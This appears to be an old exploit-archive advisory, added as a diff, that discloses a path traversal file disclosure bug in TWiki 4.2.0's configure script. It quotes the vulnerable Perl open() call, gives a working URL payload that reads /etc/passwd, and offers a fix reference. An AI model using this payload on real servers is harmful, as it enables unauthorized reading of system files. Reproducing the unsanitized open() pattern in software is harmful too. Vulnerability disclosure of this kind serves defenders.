@@ -1,0 +1,61 @@
+################################################################################################################
+#                                                                                                              #
+#                                 TWiki 4.2.0 File Disclosure Vuln (configure)                                 #
+#                                                                                                              #
+################################################################################################################
+
+	"We're brazilian newbies!!! :p" - Th1nk3r
+
+Info
+----------------------------------------------------------------------------------------------------------------
+Classe    :  Input Validation Error 
+Remote    :  Yes
+Local     :  No
+Date      :  05/08/2008
+Credits   :  Th1nk3r  (cnwfhguohrugbo / gmail.com)
+Greetz    :  w4n73d h4ck3r, Vitor, Vonnatur, FuradordeSyS, B470-Killer, M4v3rick.
+
+Description
+----------------------------------------------------------------------------------------------------------------
+	TWiki version 4.2.0 (I haven't tested other versions) is vulnerable to a File Disclosure. It's only possible
+to exploit the bug if you can access the "/bin/configure" script.
+Otherwise, you can not exploit this bug.
+	Vulnerable code of "/bin/configure" script:
+
+	if( $action eq 'image' ) {
+    		# SMELL: this call is correct, but causes a perl error
+    		# on some versions of CGI.pm
+    		# print $query->header(-type => $query->param('type'));
+    		# So use this instead:
+    		print 'Content-type: '.$query->param('type')."\n\n";
+    	if( open(F, 'logos/'.$query->param('image' ))) {
+        	local $/ = undef;
+        	print <F>;
+        	close(F);
+    	}
+    	exit 0;
+}
+
+	The bug is in the open() function. The file is set by visitor, and there is no protection added
+by the programmer.
+	Note that "$query->param('type')" can be set by the visitor. Therefore, you'll set it to "text/plain".
+
+
+
+Exploit
+----------------------------------------------------------------------------------------------------------------
+
+	To exploit the bug, you just need set the "image" variable to the path of file you wish to view. 
+	The file will be revealed if you have permission to view it.
+	
+	By example, to show the "/etc/passwd" file content, go to :
+	http://www.examplo.org/{PATH}/bin/configure?action=image;image=../../../../../../etc/passwd;type=text/plain
+
+
+
+Solution
+----------------------------------------------------------------------------------------------------------------
+	Read "http://twiki.org/cgi-bin/view/TWiki/TWikiInstallationGuide", Basic Installation, topic 8, for 
+more information of how to protect your "configure" script.
+
+# milw0rm.com [2008-08-19]
